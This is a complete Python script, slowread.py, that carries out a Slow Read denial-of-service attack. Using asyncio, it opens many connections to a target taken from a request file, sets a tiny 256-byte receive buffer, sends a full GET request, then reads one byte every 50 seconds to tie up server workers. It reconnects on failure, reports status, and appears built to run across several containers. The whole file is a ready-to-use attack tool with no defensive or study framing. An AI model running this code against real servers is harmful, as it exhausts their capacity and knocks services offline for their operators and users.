#!/usr/bin/env python3
"""
slowread.py — Slow Read attack.
Sends a complete GET request with full browser headers, then reads the response
at 1 byte every DRAIN_INTERVAL seconds. TCP window fills, server worker stuck on send().
"""

import asyncio
import time
import sys
import os
import socket

from request_loader import load_request_data, build_raw_headers

REQ = load_request_data()
TARGET_HOST = REQ["host"]
TARGET_PORT = REQ["port"]

CONNECT_TIMEOUT = 15
DRAIN_INTERVAL = 50
RECONNECT_DELAY = 5

NUM_CONNECTIONS = int(sys.argv[1]) if len(sys.argv) > 1 else 20
CONTAINER_NAME = os.environ.get("CONTAINER_NAME", "instance-1")

active_slots = 0
total_connects = 0
total_errors = 0
lock = asyncio.Lock()


async def slow_read_worker(cid: int):
    global active_slots, total_connects, total_errors

    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET_HOST, TARGET_PORT),
                timeout=CONNECT_TIMEOUT,
            )

            sock = writer.get_extra_info("socket")
            if sock:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256)

            async with lock:
                active_slots += 1
                total_connects += 1

            raw = build_raw_headers(REQ, override_method="GET")
            if "Accept-Encoding" in REQ["headers"]:
                raw = raw.replace(
                    f"Accept-Encoding: {REQ['headers']['Accept-Encoding']}",
                    "Accept-Encoding: identity"
                )
            raw += "\r\n"

            writer.write(raw.encode())
            await writer.drain()

            header_buf = b""
            while b"\r\n\r\n" not in header_buf:
                chunk = await asyncio.wait_for(reader.read(64), timeout=30)
                if not chunk:
                    raise ConnectionError("Server closed before headers complete")
                header_buf += chunk

            while True:
                await asyncio.sleep(DRAIN_INTERVAL)
                try:
                    data = await asyncio.wait_for(reader.read(1), timeout=2)
                    if not data:
                        break
                except asyncio.TimeoutError:
                    pass

        except Exception:
            async with lock:
                total_errors += 1
                if active_slots > 0:
                    active_slots -= 1
            await asyncio.sleep(RECONNECT_DELAY)

        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass


async def status_reporter():
    start = time.time()
    while True:
        await asyncio.sleep(30)
        elapsed = int(time.time() - start)
        print(
            f"[{CONTAINER_NAME}] T+{elapsed}s | "
            f"slots={active_slots}/{NUM_CONNECTIONS} | "
            f"connects={total_connects} | errors={total_errors}",
            flush=True,
        )


async def main():
    print(f"[{CONTAINER_NAME}] Async Slow Read — {NUM_CONNECTIONS} coroutines", flush=True)
    print(f"[{CONTAINER_NAME}] Target: {TARGET_HOST}:{TARGET_PORT}{REQ['path']}", flush=True)
    print(f"[{CONTAINER_NAME}] Headers: {len(REQ['headers'])} | Cookies: {len(REQ['cookies'])}", flush=True)

    tasks = []
    for i in range(NUM_CONNECTIONS):
        tasks.append(asyncio.create_task(slow_read_worker(i)))
        if i % 50 == 49:
            await asyncio.sleep(0.2)

    tasks.append(asyncio.create_task(status_reporter()))
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
